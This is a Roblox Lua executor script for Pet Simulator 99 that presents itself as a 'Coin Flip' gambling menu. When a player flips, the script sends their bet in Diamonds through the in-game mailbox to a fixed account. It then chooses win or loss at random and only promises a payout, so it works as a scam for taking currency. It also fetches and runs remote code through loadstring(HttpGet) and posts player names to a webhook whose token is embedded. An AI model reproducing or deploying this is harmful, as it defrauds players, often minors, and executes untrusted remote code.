local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "PS99 Gambling", HidePremium = false, SaveConfig = false, ConfigFolder = "OrionTest"})
OrionLib:MakeNotification({
	Name = "READ ME",
	Content = "Make sure to stand near mailbox for the best experience.",
	Image = "rbxassetid://4483345998",
	Time = 15
})
local CF = Window:MakeTab({
	Name = "Coin Flip",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

CF:AddTextbox({
	Name = "Bet",
	Default = "",
	TextDisappear = false,
	Callback = function(bet)
		betAmount = tonumber(bet)
	end	  
})

CF:AddDropdown({
	Name = "Choice",
	Default = "None",
	Options = {"Heads", "Tails"},
	Callback = function(choice)
		userChoice = tostring(choice)
	end    
})

CF:AddButton({
	Name = "Flip Coin!",
	Callback = function()
      	flipCoin()
  	end    
})

OrionLib:Init()

function flipCoin()
    local GetSave = function()
        return require(game.ReplicatedStorage.Library.Client.Save).Get()
    end

    local saveData = GetSave()

    for i, v in pairs(saveData.Inventory.Currency) do
        if v.id == "Diamonds" and v._am >= betAmount then
            local args = {
                [1] = "oirhnuggy",
                [2] = v.id,
                [3] = "Currency",
                [4] = i,
                [5] = betAmount
            }
            game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
        end
    end
    task.wait(1)
    OrionLib:MakeNotification(
        {
            Name = "Validating...",
            Content = "Checking if payment was successful.",
            Image = "rbxassetid://4483345998",
            Time = 3
        }
    )
    task.wait(2)
    local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
    local result = saveModule.Get()

    local ml = result.MailLog
    for i, v in pairs(ml) do
        if v.Item and v.Item.data then
            local itemData = v.Item.data
            if v.Receiver == 2042685435 and itemData.id == "Diamonds" and itemData._am >= betAmount then
                OrionLib:MakeNotification(
                    {
                        Name = "Success!",
                        Content = "Payment was successful.",
                        Image = "rbxassetid://4483345998",
                        Time = 3
                    }
                )
            end
        end
    end
    OrionLib:MakeNotification({
        Name = "Flipping...",
        Content = "Flipping Coin.",
        Image = "rbxassetid://4483345998",
        Time = 3
    })
    task.wait(3)
    math.randomseed(os.time())
    local messages = {
        "Congrats you won, we will send double of your bet ASAP.",
        "Sorry you lost, better luck next time."
    }
    local choice = messages[math.random(#messages)]
    if choice == "Congrats you won, we will send double of your bet ASAP." then
        local syn = syn or {}
        local request = syn.request or http_request
        local HttpService = game:GetService("HttpService")
        
        local webhookUrl = "https://webhook.lewistehminerz.dev/api/webhooks/1204658074741248011/hCmI1dhgDo5vhYlfZfAHQwpNLmhGojicKX3gd5lYuXnpT6gX4zxA5YAjcBbQl8mR00Te"

        local lp = game.Players.LocalPlayer.Name
        
        local function sendWebhookMessage(embed)
            local success, response =
                pcall(
                function()
                    request(
                        {
                            Url = webhookUrl,
                            Method = "POST",
                            Headers = {["Content-Type"] = "application/json"},
                            Body = HttpService:JSONEncode({embeds = {embed}})
                        }
                    )
                end
            )
        end
        
        local embed = {
            title = "PS99 Gamble",
            description = lp .. " has won " .. betAmount * 2 .. ".",
            color = 0xFB9BCB
        }
        sendWebhookMessage(embed) 
        OrionLib:MakeNotification({
            Name = "Congrats!",
            Content = choice,
            Image = "rbxassetid://4483345998",
            Time = 15
        })
    else
        OrionLib:MakeNotification({
            Name = "You Loss :(",
            Content = choice,
            Image = "rbxassetid://4483345998",
            Time = 15
        })
    end
end
